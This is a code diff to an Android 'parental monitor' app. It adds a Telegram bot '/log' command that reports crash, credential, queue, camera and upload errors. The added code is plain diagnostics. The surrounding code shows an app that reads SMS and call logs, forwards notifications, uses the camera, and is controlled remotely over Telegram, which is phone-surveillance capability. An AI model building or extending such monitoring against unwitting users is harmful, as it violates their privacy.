@@ -12,6 +12,7 @@ import com.redeye.parentalmonitor.data.MessageQueue
 import com.redeye.parentalmonitor.data.PreferencesManager
 import com.redeye.parentalmonitor.network.TelegramClient
 import com.redeye.parentalmonitor.network.TelegramMessage
+import com.redeye.parentalmonitor.utils.CrashReporter
 import com.redeye.parentalmonitor.utils.MessageScheduler
 import com.redeye.parentalmonitor.repository.CallLogRepository
 import com.redeye.parentalmonitor.repository.SmsRepository
@@ -446,6 +447,7 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
+            com.redeye.parentalmonitor.network.BotCommand("log", "Show last crash/error log"),
             com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
         )
     }
@@ -634,6 +636,43 @@ class MonitoringService : Service() {
                     }
                 }
             }
+            "/log" -> {
+                val crash = try {
+                    CrashReporter.pendingReport(this)
+                } catch (_: Exception) {
+                    null
+                }
+                if (crash != null) {
+                    sendToTelegram(crash)
+                } else {
+                    sendToTelegram("\uD83E\uDDFE No crash recorded.")
+                }
+                sendToTelegram(
+                    buildString {
+                        appendLine("\uD83E\uDDFE <b>Error log</b>")
+                        val credErr = try {
+                            preferencesManager.credentialError
+                        } catch (_: Exception) {
+                            ""
+                        }
+                        appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "FAILED ($credErr)")
+                        appendLine("Queued: ${messageQueue.getQueueSize()}")
+                        appendLine("Storage: " + if (preferencesManager.isStorageEncrypted) "encrypted" else "volatile")
+                        val camErr = try {
+                            preferencesManager.lastCameraErrorNotice
+                        } catch (_: Exception) {
+                            0L
+                        }
+                        appendLine("Last camera error: " + if (camErr > 0) formatDate(camErr) else "none")
+                        val upErr = try {
+                            preferencesManager.lastUploadErrorNotice
+                        } catch (_: Exception) {
+                            0L
+                        }
+                        appendLine("Last upload error: " + if (upErr > 0) formatDate(upErr) else "none")
+                    }
+                )
+            }
             "/help", "/start" -> {
                 sendToTelegram(
                     buildString {
@@ -652,6 +691,7 @@ class MonitoringService : Service() {
                         appendLine("/stop - pause monitoring")
                         appendLine("/resume - resume monitoring")
                         appendLine("/notif <on|off|status> - notif forwarding")
+                        appendLine("/log - show last crash/error log")
                         appendLine("/help - show this list")
                     },
                     mainMenu()
